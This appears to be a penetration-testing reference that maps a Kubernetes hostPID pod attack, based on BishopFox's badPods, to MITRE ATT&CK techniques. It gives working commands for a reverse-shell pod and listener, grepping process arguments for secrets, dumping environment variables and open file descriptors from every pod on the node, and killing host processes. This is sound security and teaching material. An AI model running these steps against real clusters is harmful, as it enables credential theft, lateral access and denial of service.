# MITRE ATT&CK Mapping: hostPID Pod

---

## Attack Flow Overview

```mermaid
graph TD
    A[Deploy pod with hostPID privilege] --> B[Exec into pod]
    B --> C[Enumerate all host processes with ps]
    C --> D[Extract credentials from process command lines]
    B --> E[Read environment variables from /proc/PID/environ]
    E --> F[Extract AWS/GCP credentials and secrets]
    B --> G[Read file descriptors from /proc/PID/fd]
    G --> H[Access files opened by other pods]
    H --> I[Extract credentials from accessed files]
    B --> J[Deploy additional pods with different UIDs]
    J --> K[Access env vars and FDs for non-root processes]
```

---

## Phase 1: Pod Creation & Access

### Step 1.1: Deploy pod with hostPID privilege

**Command:**
```bash
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostpid/pod/hostpid-exec-pod.yaml
```

**MITRE Techniques:**
- **T1609** - Container Administration Command
  - Deploy container with hostPID privilege to access host's process namespace

**Pod Configuration:**
```yaml
spec:
  hostPID: true
```

---

### Step 1.2: Exec into the pod

**Command:**
```bash
kubectl exec -it hostpid-exec-pod -- bash
```

**MITRE Techniques:**
- **T1609** - Container Administration Command
  - Execute bash session inside the container with host PID namespace access

---

### Step 1.3: Alternative - Reverse shell method

**Commands:**
```bash
# Step 1: Set up listener
ncat --ssl -vlp 3116

# Step 2: Create pod with reverse shell
HOST=\"10.0.0.1\" PORT=\"3116\" envsubst < ./manifests/hostpid/pod/hostpid-revshell-pod.yaml | kubectl apply -f -

# Step 3: Catch the shell
# Connection received
```

**MITRE Techniques:**
- **T1095** - Non-Application Layer Protocol
  - Encrypted reverse shell connection using ncat --ssl for command and control

---

## Phase 2: Post Exploitation

### Step 2.1: Enumerate all processes on the host

**Command:**
```bash
ps -aux
```

**MITRE Techniques:**
- **T1057** - Process Discovery
  - Enumerate all processes running on the host and within all pods

**Example Output:**
```
root  2123072  0.0  0.0  3732  2868 ?  Ss  21:00  0:00 /bin/bash -c while true; do ./my-program --grafana-username=admin --grafana-password=admin; sleep 10;done
```

---

### Step 2.2: Extract credentials from process command lines

**Commands:**
```bash
# Search for passwords in process arguments
ps -aux | grep -i password

# Search for API keys
ps -aux | grep -i api

# Search for tokens
ps -aux | grep -i token

# Search for AWS/GCP credentials
ps -aux | grep -E '(AWS_|GOOGLE_|AZURE_)'
```

**MITRE Techniques:**
- **T1552.001** - Unsecured Credentials: Credentials In Files
  - Extract credentials from process command-line arguments visible in ps output
- **T1552.005** - Unsecured Credentials: Cloud Instance Metadata API
  - Identify cloud credential usage in process arguments

---

### Step 2.3: Read environment variables from all pod processes

**Command:**
```bash
# Enumerate environment variables for all accessible PIDs
for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done > envs.txt

# Review the output
less envs.txt
```

**MITRE Techniques:**
- **T1552.001** - Unsecured Credentials: Credentials In Files
  - Read environment variables from `/proc/[PID]/environ` for all processes
- **T1083** - File and Directory Discovery
  - Enumerate `/proc` filesystem to find environment variable files

**Example Credentials Found:**
```
/proc/578808/environ
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
DATABASE_PASSWORD=super_secret_password123
```

---

### Step 2.4: Enumerate UIDs of running processes

**Command:**
```bash
ps auxn | awk '{print $1}' | sort | uniq -c | sort -rn
```

**MITRE Techniques:**
- **T1087** - Account Discovery
  - Enumerate user IDs of processes to identify additional pods running as non-root users

**Example Output:**
```
205 0      # Most processes run as root
  9 999    # 9 processes as UID 999
  8 1000   # 8 processes as UID 1000
```

---

### Step 2.5: Deploy additional pods with different UIDs

**Command:**
```bash
# Create pod manifest running as specific UID
cat > hostpid-exec-pod-999.yaml <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: hostpid-exec-pod-999
spec:
  securityContext:
    runAsUser: 999
    runAsGroup: 999
  hostPID: true
  containers:
  - name: hostpid-pod-999
    image: ubuntu
    command: [ \"/bin/sh\", \"-c\", \"--\" ]
    args: [ \"while true; do sleep 30; done;\" ]
EOF

kubectl apply -f hostpid-exec-pod-999.yaml
kubectl exec -it hostpid-exec-pod-999 -- bash
```

**MITRE Techniques:**
- **T1610** - Deploy Container
  - Deploy additional pods with different UIDs to access environment variables of non-root processes

---

### Step 2.6: Extract environment variables for non-root processes

**Command:**
```bash
# From within the UID 999 pod
for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done > envs-999.txt

# Review environment variables
less envs-999.txt
```

**MITRE Techniques:**
- **T1552.001** - Unsecured Credentials: Credentials In Files
  - Access environment variables from processes running as non-root UIDs
- **T1078.004** - Valid Accounts: Cloud Accounts
  - Extract cloud service account credentials from environment variables

---

### Step 2.7: Enumerate file descriptors for all processes

**Command:**
```bash
for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt

# Review file descriptors
less fds.txt
```

**MITRE Techniques:**
- **T1083** - File and Directory Discovery
  - Enumerate file descriptors from `/proc/[PID]/fd` to find open files
- **T1005** - Data from Local System
  - Access files opened by other pods via file descriptors

---

### Step 2.8: Read files opened by other pods via file descriptors

**Commands:**
```bash
# Locate interesting file, e.g., vim swap file
# lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp

# Read the file via file descriptor
cat /proc/635813/fd/4
```

**MITRE Techniques:**
- **T1552.001** - Unsecured Credentials: Credentials In Files
  - Read sensitive files opened by other containers via `/proc/[PID]/fd/[X]`
- **T1005** - Data from Local System
  - Extract data from files currently opened by processes in other pods

**Example Output:**
```
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
I'm going to keep my secrets in this file!
```

---

### Step 2.9: Kill processes (denial of service - use cautiously)

**Command:**
```bash
# Kill specific process
kill [PID]

# Kill processes by name
pkill -f \"nginx\"
```

**MITRE Techniques:**
- **T1489** - Service Stop
  - Terminate processes on the host or in other pods for denial of service
- **T1485** - Data Destruction
  - Kill critical processes causing potential data loss or service disruption

> [!CAUTION]
> Killing processes on production systems can cause severe service disruption. This should NEVER be done in a penetration test without explicit permission and coordination.

---

## Phase 3: General Pod Attacks

### Step 3.1: Standard pod exploitation techniques

**Procedures:**

Even with only `hostPID=true`, standard pod attacks apply:

- Access cloud metadata service
- Query kubelet/kube-apiserver with anonymous-auth
- Hunt for vulnerable services in cluster
- Exploit known Kubernetes CVEs

**MITRE Techniques:**
- **T1552.005** - Unsecured Credentials: Cloud Instance Metadata API
  - Query cloud metadata endpoints for IAM credentials

**Reference:** See [nothing-allowed/README.md](../nothing-allowed) for details

---

## Cleanup

### Delete the pod(s)

**Commands:**
```bash
kubectl delete pod hostpid-exec-pod

# Delete additional UID-specific pods
kubectl delete pod hostpid-exec-pod-999
kubectl delete pod hostpid-exec-pod-1000

# Or using manifest
kubectl delete -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostpid/pod/hostpid-exec-pod.yaml
```

**MITRE Techniques:**
- **T1070.004** - Indicator Removal: File Deletion
  - Remove malicious pods to clean up evidence of exploitation

---

## Summary

### Key Attack Vectors

1. **Process Enumeration** - View all processes on host including command-line arguments with credentials
2. **Environment Variable Access** - Read environment variables from `/proc/[PID]/environ` for all pods
3. **File Descriptor Access** - Read files currently opened by other pods via `/proc/[PID]/fd/[X]`
4. **Multi-UID Enumeration** - Deploy additional pods with different UIDs to access non-root processes

### Privilege Levels Required

**hostPID Access Limitations:**
- Can only read `/proc/[PID]/environ` for processes with **same UID** as your pod
- Can only read `/proc/[PID]/fd` for processes with **same UID** as your pod
- Must deploy multiple pods (one per UID) to access all processes on the node

### Configuration Details

```yaml
spec:
  hostPID: true
  securityContext:
    runAsUser: 0     # Default: access root processes
    # runAsUser: 999 # Deploy multiple pods for different UIDs
```

This single privilege grants:
- View all processes on the host via `ps`
- Read command-line arguments (may contain credentials)
- Read environment variables for processes with same UID
- Read file descriptors for processes with same UID
- Kill any process on the host (denial of service capability)

### Common Credentials Found

- AWS IAM access keys and secrets in environment variables
- GCP service account credentials
- Azure managed identity tokens
- Database passwords
- API keys and tokens
- Private keys and certificates
- Container registry credentials
